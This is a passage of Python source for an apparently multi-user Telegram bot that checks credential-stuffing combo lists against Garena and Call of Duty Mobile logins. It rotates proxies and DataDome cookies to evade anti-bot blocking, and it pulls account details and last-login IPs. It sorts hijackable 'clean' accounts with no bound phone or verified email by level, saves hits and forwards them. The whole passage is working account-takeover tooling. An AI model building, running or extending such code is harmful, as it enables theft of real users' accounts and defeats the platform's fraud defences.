                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f'[WARNING] Error extracting datadome: {e}')
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f'[WARNING] Error clearing datadome: {e}')

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f'[WARNING] Error setting datadome: {e}')
            return False

    def fetch_fresh_datadome_with_retry(self, session, max_retries=3):
        for attempt in range(1, max_retries + 1):
            try:
                console.print(f'[dim]🔄 Fetching fresh DataDome (attempt {attempt}/{max_retries})...[/dim]')
                
                fresh_session = cloudscraper.create_scraper()
                if hasattr(session, 'proxies') and session.proxies:
                    fresh_session.proxies = session.proxies
                
                new_datadome = get_datadome_cookie(fresh_session)
                
                if new_datadome:
                    console.print(f'[green]✅ Fresh DataDome cookie obtained: {new_datadome[:20]}...[/green]')
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                    return True
                else:
                    console.print(f'[yellow]⚠️ Attempt {attempt}: Failed to get DataDome cookie[/yellow]')
                    
            except Exception as e:
                console.print(f'[red]❌ Attempt {attempt}: Error fetching DataDome - {str(e)[:50]}[/red]')
            
            if attempt < max_retries:
                wait_time = min(2 ** attempt, 30)
                console.print(f'[dim]⏳ Waiting {wait_time} seconds before retry...[/dim]')
                time.sleep(wait_time)
        
        console.print(f'[red]❌ Failed to fetch DataDome cookie after {max_retries} attempts[/red]')
        return False

    def handle_403(self, session, proxy_config=None):
        self._403_attempts += 1
        self.consecutive_403_count += 1
        console.print(f'[red]🚫 403 Blocked - Attempt {self._403_attempts}/3 (Consecutive: {self.consecutive_403_count})[/red]')
        
        if self._403_attempts >= 3:
            self._blocked = True
            console.print('[red]🚫 IP blocked after 3 attempts - Manual intervention required[/red]')
            return True
        else:
            console.print('[cyan]🔄 Attempting to fetch fresh DataDome cookie...[/cyan]')
            if self.fetch_fresh_datadome_with_retry(session, max_retries=3):
                console.print('[green]✅ Fresh cookie obtained, continuing...[/green]')
                return False
            else:
                return False

    def is_blocked(self):
        return self._blocked

    def reset_attempts(self):
        self._403_attempts = 0
        self._blocked = False
        self.consecutive_403_count = 0

class EnhancedIPBlockHandler:
    def __init__(self, datadome_manager, vpn_manager=None, proxy_manager=None, cookie_manager=None):
        self.datadome_manager = datadome_manager
        self.vpn_manager = vpn_manager
        self.proxy_manager = proxy_manager
        self.cookie_manager = cookie_manager
        self._403_attempts = 0
        self._blocked = False
        self.consecutive_403_count = 0
        self.max_consecutive_403 = 3
        self.pending_recovery = False
        self.last_proxy_rotate_time = 0
        self.proxy_rotate_cooldown = 30
        
    def rotate_to_fresh_cookie(self, session):
        if self.cookie_manager:
            valid_cookies = self.cookie_manager.get_valid_cookies()
            if valid_cookies:
                applyck(session, '; '.join(valid_cookies))
                console.print("[dim]🔄 Rotated to fresh cookie[/dim]")
                return True
        return False
    
    def rotate_proxy(self, session):
        current_time = time.time()
        
        if current_time - self.last_proxy_rotate_time < self.proxy_rotate_cooldown:
            console.print("[dim]⏳ Proxy rotate cooldown, waiting...[/dim]")
            return False
            
        if self.proxy_manager and self.proxy_manager.working_proxies:
            new_proxy = self.proxy_manager.get_next_proxy()
            if new_proxy:
                session.proxies.update({"http": new_proxy, "https": new_proxy})
                session.proxies_used = new_proxy
                self.last_proxy_rotate_time = current_time
                console.print(f"[cyan]🔄 Rotated to new proxy: {new_proxy[:50]}[/cyan]")
                return True
        return False
    
    def handle_403_block(self, session, proxy_config=None, user_id=None):
        self._403_attempts += 1
        self.consecutive_403_count += 1
        console.print(f'[red]🚫 403 Blocked - Attempt {self._403_attempts}/{self.max_consecutive_403}[/red]')
        
        if self.proxy_manager and self.proxy_manager.connection_type != "direct":
            if self.rotate_proxy(session):
                self.datadome_manager.clear_session_datadome(session)
                time.sleep(2)
                console.print("[green]✅ Proxy rotated! Retrying...[/green]")
                self._403_attempts -= 1
                return False
        
        if self.rotate_to_fresh_cookie(session):
            time.sleep(1)
            console.print("[green]✅ Fresh cookie applied! Retrying...[/green]")
            self._403_attempts -= 1
            return False
        
        if self._403_attempts >= self.max_consecutive_403:
            self._blocked = True
            self.pending_recovery = True
            console.print('[red]🚫 Max 403 attempts reached - Marking as blocked[/red]')
            return True
        
        return False
    
    def is_blocked(self):
        return self._blocked or self.pending_recovery
    
    def reset(self):
        self._403_attempts = 0
        self._blocked = False
        self.consecutive_403_count = 0
        self.pending_recovery = False

# ==================== AUTO LEAK DETECTION CLASS ====================
class AutoLeakChecker:
    def __init__(self):
        self.cache = {}
        self.cache_ttl = 3600
        
    def _hash_password(self, password):
        return hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    
    def check_haveibeenpwned_password(self, password):
        try:
            password_hash = self._hash_password(password)
            prefix = password_hash[:5]
            suffix = password_hash[5:]
            
            response = requests.get(
                f'https://api.pwnedpasswords.com/range/{prefix}',
                timeout=10,
                headers={'User-Agent': 'CODM-Checker-Bot/1.0'}
            )
            
            if response.status_code == 200:
                hashes = response.text.splitlines()
                for line in hashes:
                    if line.split(':')[0] == suffix:
                        count = int(line.split(':')[1])
                        return {
                            'leaked': True,
                            'source': 'HaveIBeenPwned (Passwords)',
                            'count': count,
                            'severity': 'HIGH' if count > 1000 else 'MEDIUM' if count > 100 else 'LOW'
                        }
                return {'leaked': False}
        except:
            return None
        return None
    
    def check_haveibeenpwned_email(self, email):
        try:
            response = requests.get(
                f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}',
                timeout=10,
                headers={'User-Agent': 'CODM-Checker-Bot/1.0'}
            )
            
            if response.status_code == 200:
                breaches = response.json()
                breach_names = [b.get('Name', 'Unknown') for b in breaches]
                return {
                    'leaked': True,
                    'source': 'HaveIBeenPwned (Email)',
                    'breaches': breach_names[:5],
                    'severity': 'HIGH'
                }
            elif response.status_code == 404:
                return {'leaked': False}
        except:
            pass
        return None
    
    def comprehensive_check(self, email, password):
        cache_key = f"{email}:{password}"
        
        results = {
            'leaked': False,
            'sources': [],
            'details': [],
            'password_leaked': False,
            'email_leaked': False,
            'severity': 'LOW'
        }
        
        password_result = self.check_haveibeenpwned_password(password)
        if password_result and password_result.get('leaked'):
            results['leaked'] = True
            results['password_leaked'] = True
            results['sources'].append('HaveIBeenPwned (Password)')
            results['details'].append({
                'source': '🔐 HIBP Passwords',
                'info': f"Password appears in {password_result.get('count', 0)} breaches"
            })
            results['severity'] = 'HIGH'
        
        email_result = self.check_haveibeenpwned_email(email)
        if email_result and email_result.get('leaked'):
            results['leaked'] = True
            results['email_leaked'] = True
            results['sources'].append('HaveIBeenPwned (Email)')
            results['details'].append({
                'source': '🔍 HaveIBeenPwned',
                'info': f"Found in {len(email_result.get('breaches', []))} breaches"
            })
            if results['severity'] != 'HIGH':
                results['severity'] = 'MEDIUM'
        
        return results

auto_leak_checker = AutoLeakChecker()
leak_cache = {}

# ==================== PROCESS ACCOUNT FUNCTION (FIXED) ====================
def process_account_with_enhanced_ip_block(session, account, password, cookie_manager, 
                                           ip_block_handler, live_stats, account_line=None,
                                           proxy_config=None, user_id=None):
    try:
        if ip_block_handler.is_blocked():
            console.print(f'[yellow]⚠️ IP is blocked, waiting for recovery...[/yellow]')
            if live_stats:
                live_stats.update_stats(valid=False, account_line=account_line)
            return 'RATE_LIMITED'
        
        ip_block_handler.datadome_manager.clear_session_datadome(session)
        current_datadome = ip_block_handler.datadome_manager.get_datadome()
        if current_datadome:
            ip_block_handler.datadome_manager.set_session_datadome(session, current_datadome)
        
        MAX_PRELOGIN_RETRIES = 2
        
        v1, v2, new_datadome = None, None, None
        
        for attempt in range(MAX_PRELOGIN_RETRIES):
            prelogin_result = prelogin(session, account, ip_block_handler.datadome_manager)
            
            if len(prelogin_result) == 3:
                v1, v2, new_datadome = prelogin_result
            else:
                v1, v2, new_datadome = prelogin_result[0], prelogin_result[1], prelogin_result[2] if len(prelogin_result) > 2 else None
            
            if v1 == 'IP_BLOCKED':
                console.print(f'[red]🚫 IP BLOCKED for {account}[/red]')
                result = ip_block_handler.handle_403_block(session, proxy_config, user_id=user_id)
                if result:
                    if live_stats:
                        live_stats.update_stats(valid=False, account_line=account_line)
                    return 'RATE_LIMITED'
                else:
                    continue
                    
            if not v1 or not v2:
                if attempt < MAX_PRELOGIN_RETRIES - 1:
                    console.print(f'[dim]Retrying prelogin for {account}...[/dim]')
                    time.sleep(1)
                    continue
                if live_stats:
                    live_stats.update_stats(valid=False, account_line=account_line)
                return ''
            
            if new_datadome:
                ip_block_handler.datadome_manager.set_datadome(new_datadome)
                ip_block_handler.datadome_manager.set_session_datadome(session, new_datadome)
            
            break
        
        if not v1 or not v2:
            if live_stats:
                live_stats.update_stats(valid=False, account_line=account_line)
            return ''
        
        sso_key = login(session, account, password, v1, v2)
        
        if not sso_key:
            if live_stats:
                live_stats.update_stats(valid=False, account_line=account_line)
            return ''
        
        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
        
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        if cookie_header:
            headers['cookie'] = cookie_header
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            console.print(f'[red]🚫 403 on account init for {account}[/red]')
            result = ip_block_handler.handle_403_block(session, proxy_config, user_id=user_id)
            if result:
                if live_stats:
                    live_stats.update_stats(valid=False, account_line=account_line)
                return 'RATE_LIMITED'
            else:
                if live_stats:
                    live_stats.update_stats(valid=False, account_line=account_line)
                return ''
        
        try:
            account_data = response.json()
        except:
            if live_stats:
                live_stats.update_stats(valid=False, account_line=account_line)
            return ''
        
        if 'error' in account_data:
            error_msg = account_data.get('error', '')
            if error_msg == 'ACCOUNT DOESNT EXIST':
                if live_stats:
                    live_stats.update_stats(valid=False, account_line=account_line)
                return ''
            else:
                if live_stats:
                    live_stats.update_stats(valid=False, account_line=account_line)
                return ''
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        login_history = account_data.get('login_history') or []
        last_login_ip = None
        last_login_where = None
        last_login_ts = None
        
        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip = entry.get('ip') or entry.get('login_ip') or entry.get('ip_address')
                last_login_where = entry.get('country') or entry.get('location') or entry.get('region')
                last_login_ts = entry.get('timestamp')
        
        def fmt_ts(ts):
            try:
                ts_int = int(ts)
                return datetime.fromtimestamp(ts_int, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except Exception:
                return 'Unknown'
        
        last_login_str = fmt_ts(last_login_ts) if last_login_ts else 'Unknown'
        details['last_login'] = last_login_str
        details['last_login_where'] = last_login_where or 'N/A'
        ip_for_msg = last_login_ip or account_data.get('init_ip') or 'N/A'
        details['ip_for_msg'] = ip_for_msg
        
        if account_data.get('country'):
            details['country'] = account_data.get('country')
        
        has_codm, codm_info = check_codm_account(session, account)
        
        codm_level = None
        region = None
        country = details.get('personal', {}).get('country', 'Unknown')
        if has_codm and codm_info:
            codm_level_str = codm_info.get('codm_level', '0')
            region = codm_info.get('region', 'Unknown')
            try:
                codm_level = int(codm_level_str) if str(codm_level_str).isdigit() else None
            except:
                pass
        
        fresh_datadome = ip_block_handler.datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
        
        is_clean = details.get('is_clean', False)
        
        email = details.get('email', '')
        leak_results = {'leaked': False, 'details': [], 'severity': 'LOW'}
        
        if email and email != 'N/A':
            try:
                leak_results = auto_leak_checker.comprehensive_check(email, password)
            except Exception as e:
                logger.error(f"Leak check error: {e}")
        
        if live_stats:
            live_stats.update_stats(
                valid=True, 
                clean=is_clean, 
                has_codm=has_codm, 
                codm_level=codm_level, 
                account_line=account_line,
                leaked=leak_results.get('leaked', False),
                region=region,
                country=country
            )
        
        result_dict = {
            'success': True,
            'has_codm': has_codm,
            'account': account,
            'password': password,
            'details': details,
            'codm_info': codm_info if has_codm else {},
            'is_clean': is_clean,
            'clean_tag': details.get('clean_tag', 'not_clean'),
            'clean_status': details.get('clean_status', 'Not Clean'),
            'leak_results': leak_results,
            'codm_level': codm_level
        }
        
        if is_clean and has_codm and codm_level and codm_level >= MIN_LEVEL_FOR_FORWARD:
            account_info = {
                'account': account,
                'password': password,
                'details': details,
                'codm_info': codm_info,
                'codm_level': codm_level
            }
            send_clean_account_sync(account_info)
        
        return result_dict
        
    except Exception as e:
        logger.error(f'Error processing account {account}: {e}')
        if live_stats:
            live_stats.update_stats(valid=False, account_line=account_line)
        return ''

def create_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    empty = width - filled
    bar = "█" * filled + "░" * empty
    return f"[{bar}] {percentage:.0f}%"

# ==================== COMBO FILE MANAGER ====================
class ComboFileManager:
    @staticmethod
    def save_original_combo(file_path: str, original_filename: str, user_id: int):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        new_filename = f"{timestamp}_{user_id}_{original_filename}"
        dest_path = COMBO_DIR / new_filename
        
        try:
            shutil.copy2(file_path, dest_path)
            console.print(f"[dim]💾 Saved original combo to: {dest_path}[/dim]")
            return dest_path
        except Exception as e:
            console.print(f"[red]Error saving combo: {e}[/red]")
            return None
    
    @staticmethod
    def save_processed_combo(file_path: str, original_filename: str, user_id: int):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        new_filename = f"processed_{timestamp}_{user_id}_{original_filename}"
        dest_path = COMBO_PROCESSED_DIR / new_filename
        
        try:
            shutil.copy2(file_path, dest_path)
            console.print(f"[dim]💾 Saved processed combo to: {dest_path}[/dim]")
            return dest_path
        except Exception as e:
            console.print(f"[red]Error saving processed combo: {e}[/red]")
            return None
    
    @staticmethod
    def save_hit_accounts(accounts: list, original_filename: str):
        if not accounts:
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"hits_{timestamp}_{original_filename}"
        filepath = COMBO_HITS_DIR / filename
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"# CODM Hits - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Source: {original_filename}\n")
                f.write(f"# Total Hits: {len(accounts)}\n\n")
                for account in accounts:
                    if isinstance(account, dict):
                        line = f"{account.get('account', '')}:{account.get('password', '')}"
                        if account.get('codm_info'):
                            line += f" # Level: {account.get('codm_info', {}).get('codm_level', 'N/A')}"
                        f.write(f"{line}\n")
                    else:
                        f.write(f"{account}\n")
            console.print(f"[green]💾 Saved {len(accounts)} hits to: {filepath}[/green]")
            return filepath
        except Exception as e:
            console.print(f"[red]Error saving hits: {e}[/red]")
            return None
    
    @staticmethod
    def save_clean_accounts(accounts: list, original_filename: str):
        if not accounts:
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"clean_{timestamp}_{original_filename}"
        filepath = COMBO_CLEAN_DIR / filename
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"# Clean CODM Accounts - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Source: {original_filename}\n")
                f.write(f"# Total Clean Accounts: {len(accounts)}\n\n")
                for account in accounts:
                    if isinstance(account, dict):
                        line = f"{account.get('account', '')}:{account.get('password', '')}"
                        f.write(f"{line}\n")
                    else:
                        f.write(f"{account}\n")
            console.print(f"[green]💾 Saved {len(accounts)} clean accounts to: {filepath}[/green]")
            return filepath
        except Exception as e:
            console.print(f"[red]Error saving clean accounts: {e}[/red]")
            return None

    @staticmethod
    def save_clean_no_bind_accounts(accounts: list, original_filename: str):
        if not accounts:
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"clean_no_bind_{timestamp}_{original_filename}"
        filepath = COMBO_CLEAN_DIR / filename
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"# CLEAN ACCOUNTS - NO MOBILE BOUND & NO EMAIL VERIFIED\n")
                f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Source: {original_filename}\n")
                f.write(f"# Total Clean Accounts: {len(accounts)}\n")
                f.write(f"# Criteria: No mobile number bound AND No email verified\n\n")
                f.write("# Format: username:password\n")
                f.write("#" + "="*60 + "\n\n")
                
                for account in accounts:
                    if isinstance(account, dict):
                        line = f"{account.get('account', '')}:{account.get('password', '')}"
                        codm_info = account.get('codm_info', {})
                        if codm_info.get('codm_level'):
                            line += f" # Level: {codm_info.get('codm_level')}"
                            if codm_info.get('codm_nickname'):
                                line += f" | Nick: {codm_info.get('codm_nickname')}"
                        f.write(f"{line}\n")
                    else:
                        f.write(f"{account}\n")
            
            console.print(f"[green]💾 Saved {len(accounts)} clean (no bind) accounts to: {filepath}[/green]")
            return filepath
        except Exception as e:
            console.print(f"[red]Error saving clean no bind accounts: {e}[/red]")
            return None

    @staticmethod
    def save_clean_by_level(accounts_by_level: dict, original_filename: str):
        if not accounts_by_level:
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"clean_by_level_{timestamp}_{original_filename}"
        filepath = COMBO_CLEAN_DIR / filename
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"# CLEAN ACCOUNTS GROUPED BY LEVEL\n")
                f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Source: {original_filename}\n")
                f.write(f"# Criteria: No mobile bound AND No email verified\n\n")
                
                level_ranges = ['1-50', '51-80', '81-100', '101-150', '151-200', '201-250', '251-300', '301+']
                
                for level_range in level_ranges:
                    accounts = accounts_by_level.get(level_range, [])
                    if accounts:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"# LEVEL {level_range} - {len(accounts)} accounts\n")
                        f.write(f"{'='*60}\n\n")
                        for account in accounts:
                            if isinstance(account, dict):
                                line = f"{account.get('account', '')}:{account.get('password', '')}"
                                codm_info = account.get('codm_info', {})
                                if codm_info.get('codm_nickname'):
                                    line += f" # {codm_info.get('codm_nickname')}"
                                f.write(f"{line}\n")
                            else:
                                f.write(f"{account}\n")
            
            console.print(f"[green]💾 Saved clean accounts by level to: {filepath}[/green]")
            return filepath
        except Exception as e:
            console.print(f"[red]Error saving clean accounts by level: {e}[/red]")
            return None

# ==================== FILE QUEUE ITEM ====================
class FileQueueItem:
    def __init__(self, file_path: str, original_filename: str, accounts: list, total_accounts: int, duplicates_removed: int):
        self.file_path = file_path
        self.original_filename = original_filename
        self.accounts = accounts
        self.total_accounts = total_accounts
        self.duplicates_removed = duplicates_removed
        self.stats = None
        self.hit_lines = []
        self.clean_no_bind_accounts = []
        self.clean_by_level = {}
        self.clean_file_path = None
        self.clean_level_file_path = None
        self.status = 'pending'
        self.start_time = None
        self.end_time = None
        
    def get_duration(self):
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0

# ==================== USER-SPECIFIC CHECKER ====================
class UserAccountChecker:
    def __init__(self, user_id, update, context, concurrent_manager):
        self.user_id = user_id
        self.update = update
        self.context = context
        self.concurrent_manager = concurrent_manager
        self.is_running = False
        self.should_stop = False
        self.current_file = None
        self.stats = None
        self.codm_hits = []
        self.clean_no_bind_accounts = []
        self.clean_accounts_by_level = {
            '1-50': [], '51-80': [], '81-100': [], '101-150': [],
            '151-200': [], '201-250': [], '251-300': [], '301+': []
        }
        
        self.session = None
        self.cookie_manager = CookieManager()
        self.datadome_manager = DataDomeManager()
        self.proxy_manager = global_proxy_manager
        
        pref = get_user_proxy_preference(user_id)
        if pref.get('use_proxy', False):
            self.proxy_manager.set_connection_type(pref.get('proxy_type', 'rotating'))
        
        self.ip_block_handler = EnhancedIPBlockHandler(
            datadome_manager=self.datadome_manager,
            cookie_manager=self.cookie_manager,
            proxy_manager=self.proxy_manager if self.proxy_manager.connection_type != "direct" else None
        )
        self._init_session()
        
    def _init_session(self):
        if self.proxy_manager and self.proxy_manager.connection_type != "direct":
            self.session = self.proxy_manager.create_proxied_session()
            console.print(f"[cyan]🌐 Using proxy for user {self.user_id}: {self.proxy_manager.connection_type}[/cyan]")
        else:
            self.session = cloudscraper.create_scraper()
        
        valid_cookies = self.cookie_manager.get_valid_cookies()
        if valid_cookies:
            combined_cookie_str = '; '.join(valid_cookies)
            applyck(self.session, combined_cookie_str)
            final_cookie_value = valid_cookies[-1]
            if '=' in final_cookie_value:
                datadome_value = final_cookie_value.split('=', 1)[1].strip()
                if datadome_value:
                    self.datadome_manager.set_datadome(datadome_value)
                    self.datadome_manager.set_session_datadome(self.session, datadome_value)
        else:
            datadome = get_datadome_cookie(self.session)
            if datadome:
                self.datadome_manager.set_datadome(datadome)
                self.datadome_manager.set_session_datadome(self.session, datadome)
    
    def stop(self):
        self.should_stop = True
        self.is_running = False
    
    async def run_checker_async(self, accounts, file_item, progress_msg):
        self.is_running = True
        self.should_stop = False
        self.current_file = file_item
        self.stats = LiveStats()
        
        total = len(accounts)
        processed = 0
        lines_used = 0
        
        last_progress_update = time.time()
        
        for i, account_line in enumerate(accounts):
            if self.should_stop:
                try:
                    await progress_msg.edit_text(
                        f"⏹️ <b>Checking stopped</b>\n\nProcessed: {processed}/{total} accounts",
                        parse_mode='HTML'
                    )
                except:
                    pass
                break
            
            line_number = i + 1
            
            try:
                if ':' not in account_line:
                    continue
                
                account, password = account_line.split(':', 1)
                account = account.strip()
                password = password.strip()
                
                result = process_account_with_enhanced_ip_block(
                    self.session, account, password, 
                    self.cookie_manager, self.ip_block_handler, self.stats, account_line,
                    None, self.user_id
                )
                
                processed += 1
                lines_used += 1
                percentage = (processed / total) * 100
                
                current_time = time.time()
                if current_time - last_progress_update >= 2 or processed == total:
                    last_progress_update = current_time
                    progress_bar = create_progress_bar(percentage, 20)
                    stats_data = self.stats.get_stats()
                    
                    proxy_info = ""
                    if self.proxy_manager and self.proxy_manager.connection_type != "direct":
                        proxy_info = f"\n┈➤ 🌐 Proxy: {self.proxy_manager.connection_type}"
                    
                    try:
                        await progress_msg.edit_text(
                            f"🚀 <b>{stylize_text('CHECKING IN PROGRESS')}</b>\n"
                            f"📁 <b>File:</b> {file_item.original_filename[:25]}\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"{progress_bar}\n\n"
                            f"📊 <b>{processed}/{total}</b>\n"
                            f"┈➤ ✅ Valid: {stats_data.get('valid', 0)}\n"
                            f"┈➤ ❌ Invalid: {stats_data.get('invalid', 0)}\n"
                            f"┈➤ 🎮 Has CODM: {stats_data.get('has_codm', 0)}\n"
                            f"┈➤ 📭 No CODM: {stats_data.get('no_codm', 0)}\n"
                            f"┈➤ 🧹 Clean: {stats_data.get('clean', 0)}\n"
                            f"┈➤ 🔗 Bound: {stats_data.get('not_clean', 0)}\n"
                            f"┈➤ 💀 Leaked: {stats_data.get('leaked', 0)}{proxy_info}\n"
                            f"┈➤ 👥 Active: {self.concurrent_manager.get_active_count()} users",
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        console.print(f"[yellow]Progress update error: {e}[/yellow]")
                
                if isinstance(result, dict) and result.get('has_codm'):
                    codm_info = result.get('codm_info', {})
                    codm_level_str = codm_info.get('codm_level', '0')
                    try:
                        codm_level = int(codm_level_str) if str(codm_level_str).isdigit() else 0
                    except:
                        codm_level = 0
                    
                    if codm_level >= LEVEL_THRESHOLD:
                        self.codm_hits.append((line_number, result))
                        leak_results = result.get('leak_results', {'leaked': False})
                        msg = format_account_result_with_leak(
                            result['account'], result['password'],
                            result['details'], result['codm_info'], True,
                            leak_results
                        )
                        if msg:
                            msg = f"📍 <b>LINE #{line_number}</b> HIT!\n" + msg
                            asyncio.create_task(self.update.message.reply_text(msg, parse_mode='HTML'))
                    
                    details = result.get('details', {})
                    email = details.get('email', '')
                    email_verified = details.get('email_verified', False)
                    mobile = details.get('personal', {}).get('mobile_no', '')
                    mobile_bound = mobile != 'N/A' and mobile and mobile.strip()
                    
                    if not mobile_bound and not email_verified:
                        account_entry = {
                            'account': result.get('account'),
                            'password': result.get('password'),
                            'codm_info': codm_info
                        }
                        self.clean_no_bind_accounts.append(account_entry)
                        
                        if codm_level >= 301:
                            self.clean_accounts_by_level['301+'].append(account_entry)
                        elif codm_level >= 251:
                            self.clean_accounts_by_level['251-300'].append(account_entry)
                        elif codm_level >= 201:
                            self.clean_accounts_by_level['201-250'].append(account_entry)
                        elif codm_level >= 151:
                            self.clean_accounts_by_level['151-200'].append(account_entry)
                        elif codm_level >= 101:
                            self.clean_accounts_by_level['101-150'].append(account_entry)
                        elif codm_level >= 81:
                            self.clean_accounts_by_level['81-100'].append(account_entry)
                        elif codm_level >= 51:
                            self.clean_accounts_by_level['51-80'].append(account_entry)
                        else:
                            self.clean_accounts_by_level['1-50'].append(account_entry)
                
                elif isinstance(result, str):
                    if result == 'RATE_LIMITED':
                        if self.proxy_manager and hasattr(self.session, 'proxies_used') and self.session.proxies_used:
                            self.proxy_manager.mark_proxy_bad(self.session.proxies_used)
                            console.print(f"[red]🚫 Marked proxy as bad: {self.session.proxies_used[:50]}[/red]")
                            self._init_session()
                            await asyncio.sleep(1)
                
                await asyncio.sleep(0.2)
                
            except Exception as e:
                logger_telegram.error(f"Error on line {line_number}: {e}")
                processed += 1
                continue
        
        if lines_used > 0:
            use_lines(self.user_id, lines_used)
        
        if self.clean_no_bind_accounts:
            clean_no_bind_file = ComboFileManager.save_clean_no_bind_accounts(
                self.clean_no_bind_accounts, file_item.original_filename
            )
            clean_by_level_file = ComboFileManager.save_clean_by_level(
                self.clean_accounts_by_level, file_item.original_filename
            )
            
            self.context.user_data[f'clean_file_{self.user_id}'] = str(clean_no_bind_file) if clean_no_bind_file else None
            self.context.user_data[f'level_file_{self.user_id}'] = str(clean_by_level_file) if clean_by_level_file else None
        
        self.is_running = False
        return len(self.codm_hits)

# ==================== MULTI-USER CONCURRENT MANAGER ====================
class MultiUserConcurrentManager:
    def __init__(self, max_concurrent_users=10, accounts_per_batch=50):
        self.max_concurrent_users = max_concurrent_users
        self.accounts_per_batch = accounts_per_batch
        self.active_sessions = {}
        self.user_queues = {}
        self.user_checking_status = {}
        self.user_progress_messages = {}
        self.user_stats = {}
        self.lock = threading.Lock()
        
    def can_start_checking(self, user_id):
        with self.lock:
            if user_id in self.active_sessions:
                return False
            if len(self.active_sessions) >= self.max_concurrent_users:
                return False
            return True
    
    def register_session(self, user_id, session, datadome_manager, ip_block_handler):
        with self.lock:
            self.active_sessions[user_id] = {
                'session': session,
                'datadome_manager': datadome_manager,
                'ip_block_handler': ip_block_handler,
                'started_at': time.time()
            }
            self.user_checking_status[user_id] = True
    
    def unregister_session(self, user_id):
        with self.lock:
            if user_id in self.active_sessions:
                del self.active_sessions[user_id]
            self.user_checking_status[user_id] = False
    
    def get_session(self, user_id):
        with self.lock:
            if user_id in self.active_sessions:
                return self.active_sessions[user_id]
            return None
    
    def add_to_queue(self, user_id, file_item):
        with self.lock:
            if user_id not in self.user_queues:
                self.user_queues[user_id] = []
            self.user_queues[user_id].append(file_item)
            return True
    
    def get_next_file(self, user_id):
        with self.lock:
            if user_id in self.user_queues and self.user_queues[user_id]:
                return self.user_queues[user_id].pop(0)
            return None
    
    def get_queue_length(self, user_id):
        with self.lock:
            if user_id in self.user_queues:
                return len(self.user_queues[user_id])
            return 0
    
    def clear_queue(self, user_id):
        with self.lock:
            if user_id in self.user_queues:
                self.user_queues[user_id] = []
    
    def is_user_checking(self, user_id):
        with self.lock:
            return self.user_checking_status.get(user_id, False)
    
    def get_active_count(self):
        with self.lock:
            return len(self.active_sessions)
    
    def get_active_users(self):
        with self.lock:
            return list(self.active_sessions.keys())
    
    def set_progress_message(self, user_id, message):
        with self.lock:
            self.user_progress_messages[user_id] = message
    
    def get_progress_message(self, user_id):
        with self.lock:
            return self.user_progress_messages.get(user_id)

global_proxy_manager = ProxyManager()

# ==================== PROXY COMMAND HANDLERS ====================

async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_user_approved(user_id) and not is_admin(user_id):
        await safe_send_message(update, "❌ Access denied.", parse_mode='HTML')
        return
    
    keyboard = [
        [InlineKeyboardButton("📋 PROXY STATUS", callback_data="proxy_status")],
        [InlineKeyboardButton("🔍 TEST PROXIES", callback_data="proxy_test")],
        [InlineKeyboardButton("🌐 AUTO FETCH PROXIES", callback_data="proxy_fetch")],
        [InlineKeyboardButton("🔄 SET PROXY TYPE", callback_data="proxy_type")],
        [InlineKeyboardButton("⚙️ TOGGLE PROXY USE", callback_data="proxy_toggle")],
        [InlineKeyboardButton("📤 UPLOAD PROXY FILE", callback_data="proxy_upload")],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")]
    ]
    
    await safe_send_message(
        update,
        f"🌐 <b>{stylize_text('PROXY MANAGEMENT')}</b>\n\n"
        f"Manage proxy settings for your checking sessions.\n\n"
        f"<b>Current Settings:</b>\n"
        f"┈➤ Proxy Enabled: {'✅ YES' if get_user_proxy_preference(user_id).get('use_proxy', False) else '❌ NO'}\n"
        f"┈➤ Proxy Type: {get_user_proxy_preference(user_id).get('proxy_type', 'direct')}\n"
